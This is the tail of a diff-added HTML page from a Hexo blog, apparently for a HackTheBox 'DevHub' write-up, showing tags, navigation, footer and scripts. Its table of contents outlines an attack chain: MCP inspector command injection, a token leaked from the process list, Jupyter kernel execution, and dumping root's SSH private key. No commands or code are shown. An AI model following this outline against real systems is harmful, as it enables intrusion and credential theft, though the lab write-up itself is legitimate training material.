+                        <a href="/tags/Process-Argv-Disclosure/">#Process Argv Disclosure</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Flask/">#Flask</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Hidden-MCP-Tools/">#Hidden MCP Tools</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/SSH-Private-Key/">#SSH Private Key</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Linux-PE/">#Linux-PE</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/10/08/Hackthebox-Reactor/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Reactor</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: DevHub</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Foothold-%E2%80%94-CVE-2026-23744-MCPJam-Inspector-Command-Injection"><span class="nav-text">Foothold — CVE-2026-23744: MCPJam Inspector Command Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Internal-Port-Enumeration"><span class="nav-text">Internal Port Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Leaking-the-Jupyter-Token-from-ps"><span class="nav-text">Leaking the Jupyter Token from ps</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pivoting-to-analyst-%E2%80%94-Jupyter-Kernel-Execution"><span class="nav-text">Pivoting to analyst — Jupyter Kernel Execution</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#User-Flag"><span class="nav-text">User Flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumerating-OpsMCP-%E2%80%94-the-Root-Owned-Flask-API"><span class="nav-text">Enumerating OpsMCP — the Root-Owned Flask API</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dumping-Root%E2%80%99s-SSH-Private-Key"><span class="nav-text">Dumping Root’s SSH Private Key</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root-Flag"><span class="nav-text">Root Flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Key-Takeaways"><span class="nav-text">Key Takeaways</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
